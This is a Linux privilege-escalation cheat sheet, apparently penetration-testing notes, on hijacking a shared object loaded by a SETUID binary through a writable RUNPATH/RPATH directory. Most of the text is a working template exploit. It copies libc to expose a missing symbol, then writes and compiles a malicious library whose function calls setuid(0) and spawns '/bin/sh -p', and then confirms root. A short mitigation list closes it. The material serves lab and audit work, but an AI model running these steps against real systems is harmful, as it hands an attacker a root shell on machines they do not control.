# Shared Object Hijacking

#### Check SETUID binary permissions

```bash
ls -la <binary_name>
```

#### List shared object dependencies

```bash
ldd <binary_name>
```

#### Check RUNPATH / RPATH

```bash
readelf -d <binary_name> | grep PATH
```

#### List permissions of vulnerable directory

```bash
ls -la <vulnerable_directory>
```

#### Copy existing library (to trigger symbol error)

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 <vulnerable_directory>/<library_name>.so
```

#### Run binary (observe missing symbol)

```bash
./<binary_name>
```

#### Create malicious shared object (src.c)

```bash
cat > src.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void <missing_symbol>() {
    setuid(0);
    system("/bin/sh -p");
}
EOF
```

#### Compile malicious shared object

```bash
gcc src.c -fPIC -shared -o <vulnerable_directory>/<library_name>.so
```

#### Run vulnerable binary

```bash
./<binary_name>
```

#### Verify root access

```bash
id
whoami
```

## Mitigation

* **RUNPATH vs RPATH:** RUNPATH is preferred; RPATH is older. Both can be abused.
* Writable library directories are a **critical misconfiguration**.
* Harden by:

  * Removing write permissions
  * Using full paths to libraries
  * Auditing binaries with custom RUNPATH/RPATH
  * Compiling with hardened linker flags